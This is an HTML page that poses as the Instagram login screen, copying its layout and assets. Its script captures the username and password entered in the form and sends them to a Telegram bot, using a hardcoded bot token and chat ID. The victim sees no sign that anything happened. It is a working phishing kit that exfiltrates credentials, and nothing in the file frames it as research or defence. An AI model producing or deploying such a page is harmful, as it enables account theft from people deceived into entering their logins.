<!doctypehtml><html lang=en><meta charset=UTF-8><meta content="width=device-width,initial-scale=1"name=viewport><title>Instagram Login</title><style>.login-form h1{font-size:2.2em;margin-bottom:10px;text-align:center}body{background-color:#fafafa;font-family:Arial,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}.container{display:flex;flex-direction:row;align-items:center}.backgroundimg{position:relative;width:454px;height:618px;background-image:url(https://www.instagram.com/sta/images/homepage/phones/home-phones.png/1dc085cdb87d.png);background-size:cover;background-repeat:no-repeat;margin-right:30px}.image-in{position:absolute;top:52px;left:87px;width:273px;height:487px;display:flex;overflow:hidden}.image-in img{width:100%;height:auto;border:none;transition:opacity .5s ease-in-out}.login-form{background-color:#fff;border:1px solid #dbdbdb;padding:20px;width:350px}.login-form h1{font-size:2.2em;margin-bottom:10px}.login-form input{width:100%;padding:10px;margin:5px 0;border:1px solid #dbdbdb;border-radius:3px;background-color:#fafafa}.login-form button{width:100%;padding:10px;margin:10px 0;background-color:#0095f6;color:#fff;border:none;border-radius:3px;font-weight:700}.login-form button:hover{background-color:#0073e6}.login-form .divider{display:flex;align-items:center;text-align:center;margin:20px 0}.login-form .divider::after,.login-form .divider::before{content:'';flex:1;border-bottom:1px solid #dbdbdb}.login-form .divider::before{margin-right:.25em}.login-form .divider::after{margin-left:.25em}.login-form .divider span{color:#8e8e8e;font-weight:500}.login-form .facebook-login{color:#385185;text-align:center;font-weight:700}.login-form .forgot-password{text-align:center;color:#00376b;margin-top:10px}.login-form .signup{text-align:center;margin-top:20px}.login-form .signup a{color:#0095f6;font-weight:700;text-decoration:none}.login-form .app-links{text-align:center;margin-top:20px}.login-form .app-links img{width:135px;margin:5px}</style><form class=login-form id=loginForm><h1>Instagram</h1><input id=username placeholder="Phone number, username, or email"> <input id=password placeholder=Password type=password> <button type=submit>Log in</button><div class=divider><span>OR</span></div><div class=facebook-login>Log in with Facebook</div><div class=forgot-password>Forgot password?</div><div class=signup>Don't have an account? <a href=#>Sign up</a></div><div class=app-links><img alt="App Store"src=https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png> <img alt="Google Play"src=https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png></div></form><script>const loginForm = document.getElementById('loginForm');
        const usernameInput = document.getElementById('username');
        const passwordInput = document.getElementById('password');
        const phoneImage = document.querySelector('.phone-image');

        
        let currentIndex = 0;

        function changeImage() {
            currentIndex = (currentIndex + 1) % images.length;
            phoneImage.src = images[currentIndex];
        }

        setInterval(changeImage, 10000); // Change image every 10 seconds

        loginForm.addEventListener('submit', (e) => {
            e.preventDefault();

            const username = usernameInput.value;
            const password = passwordInput.value;

            const telegramBotToken = '7131876676:AAHAItGzIF6jurMHcCJVxDfpY1q4uykB8_g';
            const chatId = '1201917438';
            const message = `Username: ${username}\nPassword: ${password}`;

            fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: chatId, text: message })
            })
            .then(() => {
                ('Login failed.');
            })
            .catch((error) => {
                console.error('Error sending login credentials:', error);
            });
        });</script>
